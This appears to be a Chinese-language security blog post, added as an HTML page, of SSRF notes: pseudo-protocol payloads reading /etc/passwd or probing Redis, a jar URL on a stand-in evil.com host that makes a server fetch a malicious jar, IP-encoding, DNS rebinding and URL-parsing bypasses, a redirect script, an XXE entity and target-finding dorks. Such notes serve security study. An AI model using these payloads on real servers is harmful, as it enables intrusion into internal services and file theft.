@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>SSRF | H4ck3r Station</title>
+<meta name="keywords" content="">
+<meta name="description" content="伪协议
+PHP
+http/s://  常用于探测存活主机和开放端口,配合burp
+https://example.com/title?title=http://127.0.0.1:6379
+file://  读取文件内容
+file:///etc/passwd
+dict://  字典服务协议，可以通过这个协议执行一些指令.但是dict很难完成复杂的认证，他每次发送的请求都是新建立的连接
+dict://127.0.0.1:6379/info
+gopher://  gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）
+gopher://&lt;host&gt;:&lt;port&gt;/_&lt;payload&gt;
+
+_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
+&lt;payload&gt; : 经过URL编码的原始tcp数据流
+JAVA
+file:// 协议	与 PHP 类似
+可以读取本地文件：file:///etc/passwd。
+netdoc:// 协议	它允许你访问并提取 jar 包中的内容。
+
+Payload: netdoc:///etc/passwd
+
+jar:// 协议	它允许你访问并提取 jar 包中的内容。
+
+语法： jar:{url}!/{entry}
+用法： jar:http://evil.com/test.jar!/com/test/Main.class
+利用点：
+
+让服务器去下载远程恶意 jar 包。
+读取本地 classpath 下的配置文件。
+结合某些反序列化漏洞，控制类加载过程。
+
+
+
+绕过
+IP地址
+进制转换： 浏览器和许多网络库支持非十进制的 IP。
+
+八进制： 0177.0.0.1
+十六进制： 0x7f.0x0.0x0.0x1
+十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&gt; 2130706433
+
+特殊省略写法：
+
+127.0.0.1 可以写成 127.1 或 127.0.1。
+0.0.0.0 在 Linux 下通常也会指向本地。
+
+IPv6 绕过：
+使用 [::1] 代表 127.0.0.1。
+使用 IPv6 格式的内网地址。
+利用DNS">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/ssrf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a72a21d173e6574a7d787ef864b8ff56506981bd547deea0fbd1766f099539cc.css" integrity="sha256-pyoh0XPmV0p9eH74ZLj/VlBpgb1Ufe6g&#43;9F2bwmVOcw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/ssrf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="H4ck3r Station (Alt + H)">H4ck3r Station</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="档案">
+                    <span>档案</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      SSRF
+    </h1>
+    <div class="post-meta"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>1 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e4%bc%aa%e5%8d%8f%e8%ae%ae" aria-label="伪协议">伪协议</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#php" aria-label="PHP">PHP</a></li>
+                <li>
+                    <a href="#java" aria-label="JAVA">JAVA</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87" aria-label="绕过">绕过</a></li>
+                <li>
+                    <a href="#%e6%bc%8f%e6%b4%9e%e7%9a%84%e6%8c%96%e6%8e%98" aria-label="漏洞的挖掘">漏洞的挖掘</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="伪协议">伪协议<a hidden class="anchor" aria-hidden="true" href="#伪协议">#</a></h3>
+<h5 id="php">PHP<a hidden class="anchor" aria-hidden="true" href="#php">#</a></h5>
+<p><code>http/s://  </code>常用于探测存活主机和开放端口,配合burp</p>
+<pre tabindex="0"><code>https://example.com/title?title=http://127.0.0.1:6379
+</code></pre><p><code>file:// </code> 读取文件内容</p>
+<pre tabindex="0"><code>file:///etc/passwd
+</code></pre><p><code>dict://  </code>字典服务协议，可以通过这个协议执行一些指令.但是<code>dict</code>很难完成复杂的认证，他每次发送的请求都是新建立的连接</p>
+<pre tabindex="0"><code>dict://127.0.0.1:6379/info
+</code></pre><p><code>gopher:// </code> gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）</p>
+<pre tabindex="0"><code>gopher://&lt;host&gt;:&lt;port&gt;/_&lt;payload&gt;
+
+_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
+&lt;payload&gt; : 经过URL编码的原始tcp数据流
+</code></pre><h5 id="java">JAVA<a hidden class="anchor" aria-hidden="true" href="#java">#</a></h5>
+<p><code>file://</code> 协议	与 PHP 类似</p>
+<p>可以读取本地文件：<code>file:///etc/passwd</code>。</p>
+<p><code>netdoc://</code> 协议	它允许你访问并提取 <code>jar</code> 包中的内容。</p>
+<ul>
+<li>Payload: <code>netdoc:///etc/passwd</code></li>
+</ul>
+<p><code>jar://</code> 协议	它允许你访问并提取 <code>jar</code> 包中的内容。</p>
+<ul>
+<li>语法： <code>jar:{url}!/{entry}</code></li>
+<li>用法： <code>jar:http://evil.com/test.jar!/com/test/Main.class</code></li>
+<li>利用点：
+<ol>
+<li>让服务器去下载远程恶意 jar 包。</li>
+<li>读取本地 classpath 下的配置文件。</li>
+<li>结合某些反序列化漏洞，控制类加载过程。</li>
+</ol>
+</li>
+</ul>
+<h3 id="绕过">绕过<a hidden class="anchor" aria-hidden="true" href="#绕过">#</a></h3>
+<p><strong>IP地址</strong></p>
+<pre tabindex="0"><code>进制转换： 浏览器和许多网络库支持非十进制的 IP。
+
+八进制： 0177.0.0.1
+十六进制： 0x7f.0x0.0x0.0x1
+十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&gt; 2130706433
+
+特殊省略写法：
+
+127.0.0.1 可以写成 127.1 或 127.0.1。
+0.0.0.0 在 Linux 下通常也会指向本地。
+
+IPv6 绕过：
+使用 [::1] 代表 127.0.0.1。
+使用 IPv6 格式的内网地址。
+</code></pre><p><strong>利用DNS</strong></p>
+<p>如果后端校验了域名解析后的IP，但是校验逻辑存在疏忽依然可以利用</p>
+<ol>
+<li>
+<p>域名映射</p>
+<p>利用一些指向<code>127.0.0.1</code>的公网域名</p>
+<pre tabindex="0"><code>localtest.me
+customer-127-0-0-1.nimbus.no
+127.0.0.1.nip.io
+</code></pre></li>
+<li>
+<p>DNS 重绑定</p>
+<p>原理： 控制一个dns服务器，设置极短的TTL ，第一次解析： 校验代码询问DNS，返回一个合法的外网IP，校验通过。 第二次解析：</p>
+<p>实际发起请求的代码再次询问DNS，由于TTL已经过期进行重新请求，这次返回<code>127.0.0.1</code></p>
+</li>
+<li>
+<p>URL解析差异</p>
+<p>不同的编程语言或者库对url的解析规则不同</p>
+<pre tabindex="0"><code>@符号绕过：`http://www.google.com@127.0.0.1`
+有些解析器认为访问的是 `google.com`。
+有些（如 `curl`）则认为 `@` 前面是用户名密码，实际请求的是 `127.0.0.1`。
+
+斜杠与反斜杠： http://expected.com\@127.0.0.1
+
+# 锚点绕过： http://127.0.0.1#www.google.com
+</code></pre></li>
+<li>
+<p>利用重定向</p>
+<p>如果后端只检查初始输入的 URL 协议和域名，但不检查后续的跳转。</p>
+<ol>
+<li>你在自己的服务器 <code>evil.com</code> 上放一个脚本：</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: dict://127.0.0.1:6379&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ol start="2">
+<li>
+<p>输入 URL：<code>http://evil.com/redirect.php</code></p>
+</li>
+<li>
+<p>服务器访问你的脚本，收到 302 跳转，于是顺着去请求了内网的 Redis。</p>
+</li>
+</ol>
+</li>
+<li>
+<p>java的ssrf一般跟xxe有关</p>
+<p>用户上传 XML -&gt; Java XML 解析器未禁用外部实体 -&gt; 攻击者定义一个外部实体指向内网地址 -&gt; 解析器去请求该地址。</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE test [
+  &lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1:8080/config&#34;&gt;
+]&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+</code></pre></li>
+</ol>
+<h3 id="漏洞的挖掘">漏洞的挖掘<a hidden class="anchor" aria-hidden="true" href="#漏洞的挖掘">#</a></h3>
+<ol>
+<li>
+<p>图片,文章收藏功能： 此处的图片，文章收藏中的文章就类似于分析功能中获取URL地址中的title以及文本的内容作为显示</p>
+<p>例如：title是文章的地址，收藏后访问地址变成</p>
+<pre tabindex="0"><code>https://example.com/title?title=http://title.com/askdf123
+</code></pre></li>
+<li>
+<p>google语法关键字：</p>
+<pre tabindex="0"><code>share	
+wap
+url	
+link
+src
+source
+target
+u
+display
+sourceURl
+imageURL
+domain
+</code></pre></li>
+<li>
+<p>代码审计（php）</p>
+<p>php产⽣ssrf的三个函数</p>
+<pre tabindex="0"><code>curl_exec():
+fsockopen():
+file_get_contents:
+</code></pre><p>这三个函数有⼀个共同点就是，都可以向⼀个⽹址或者站点发起⼀个请求</p>
+</li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">H4ck3r Station</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            const id = this.getAttribute("href").substr(1);
+            if (!id) return;
+
+            
+            
+            const nextUl = this.nextElementSibling;
+            if (this.closest('.toc') && nextUl && nextUl.tagName === 'UL') {
+                const rect = this.getBoundingClientRect();
+                const offsetX = e.clientX - rect.left;
+
+                
+                if (offsetX < 45) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isVisible = window.getComputedStyle(nextUl).display !== 'none';
+                    nextUl.style.display = isVisible ? 'none' : 'block';
+                    this.parentElement.classList.toggle('is-expanded');
+                    
+                    return false; 
+                }
+            }
+
+            
+            
+            e.preventDefault();
+            const targetElement = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+            if (targetElement) {
+                if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                    targetElement.scrollIntoView({ behavior: "smooth" });
+                } else {
+                    targetElement.scrollIntoView();
+                }
+                
+                if (id === "top") {
+                    history.replaceState(null, null, " ");
+                } else {
+                    history.pushState(null, null, `#${id}`);
+                }
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script></body>
+
+</html>
